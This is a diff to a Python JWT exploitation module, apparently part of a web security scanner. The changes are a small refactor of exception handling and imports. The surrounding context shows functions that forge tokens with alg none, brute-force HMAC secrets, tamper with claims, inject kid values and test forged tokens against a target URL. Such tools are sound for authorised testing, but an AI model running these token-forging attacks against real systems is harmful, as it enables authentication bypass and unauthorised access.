@@ -4,19 +4,15 @@ Full JWT exploitation: algorithm confusion, none bypass, brute force,
 claim tampering, expiry manipulation, kid injection.
 """
 
-import sys
-import os
 import json
 import hmac
 import hashlib
 import base64
 import time
 
-sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
-
 from utils.colors import log_info, log_success, log_warning
 from utils.request import smart_request
-
+from utils.request import ScanExceptions
 
 # ─────────────────────────────────────────────────────
 # JWT Helpers
@@ -26,13 +22,11 @@ def _b64_decode(data):
     data += "=" * (4 - len(data) % 4)
     return base64.urlsafe_b64decode(data)
 
-
 def _b64_encode(data):
     """Base64url encode (no padding)."""
     if isinstance(data, str):
         data = data.encode()
     return base64.urlsafe_b64encode(data).rstrip(b"=").decode()
-
 
 def _parse_jwt(token):
     """Parse a JWT token into header, payload, signature."""
@@ -51,9 +45,8 @@ def _parse_jwt(token):
             "signature": signature,
             "raw_parts": parts,
         }
-    except Exception:
+    except ScanExceptions:
         return None
-
 
 def _sign_hs256(header, payload, secret):
     """Sign a JWT with HS256."""
@@ -68,14 +61,12 @@ def _sign_hs256(header, payload, secret):
     sig_b64 = _b64_encode(sig)
     return f"{message}.{sig_b64}"
 
-
 def _find_jwt_tokens(text):
     """Find JWT tokens in text (headers, cookies, body)."""
     import re
 
     pattern = r"eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*"
     return re.findall(pattern, text)
-
 
 # ─────────────────────────────────────────────────────
 # Attack 1: Algorithm None
@@ -107,7 +98,6 @@ def attack_alg_none(parsed_jwt):
         )
 
     return findings
-
 
 # ─────────────────────────────────────────────────────
 # Attack 2: HS256 Brute Force
@@ -164,7 +154,6 @@ COMMON_SECRETS = [
     " ",
 ]
 
-
 def attack_brute_force(parsed_jwt, wordlist=None):
     """
     Brute force the HMAC secret used to sign the JWT.
@@ -197,11 +186,10 @@ def attack_brute_force(parsed_jwt, wordlist=None):
                     }
                 )
                 break
-        except Exception:
+        except ScanExceptions:
             pass
 
     return findings
-
 
 # ─────────────────────────────────────────────────────
 # Attack 3: Claim Tampering
@@ -282,7 +270,6 @@ def attack_claim_tamper(parsed_jwt, cracked_secret=None):
 
     return findings
 
-
 # ─────────────────────────────────────────────────────
 # Attack 4: KID Injection
 # ─────────────────────────────────────────────────────
@@ -318,7 +305,7 @@ def attack_kid_injection(parsed_jwt):
                 sig = hmac.new(b"", message, hashlib.sha256).digest()
                 sig_b64 = _b64_encode(sig)
                 forged = f"{header_b64}.{payload_b64}.{sig_b64}"
-            except Exception:
+            except ScanExceptions:
                 forged = f"{header_b64}.{payload_b64}."
         else:
             forged = f"{header_b64}.{payload_b64}."
@@ -333,7 +320,6 @@ def attack_kid_injection(parsed_jwt):
         )
 
     return findings
-
 
 # ─────────────────────────────────────────────────────
 # Token Verification (test if forged tokens are accepted)
@@ -351,11 +337,10 @@ def _test_forged_token(url, token, original_response, delay=0):
                 "location": "Authorization header",
                 "status": resp.status_code,
             }
-    except Exception:
+    except ScanExceptions:
         pass
 
     return {"accepted": False}
-
 
 # ─────────────────────────────────────────────────────
 # Main Scanner
@@ -396,7 +381,7 @@ def scan_jwt(url, delay=0, cookie=None):
                 cookie_tokens = _find_jwt_tokens(cookie_header)
                 tokens.update(cookie_tokens)
 
-    except Exception as e:
+    except ScanExceptions as e:
         log_warning(f"Failed to fetch URL: {e}")
 
     # Check provided cookie
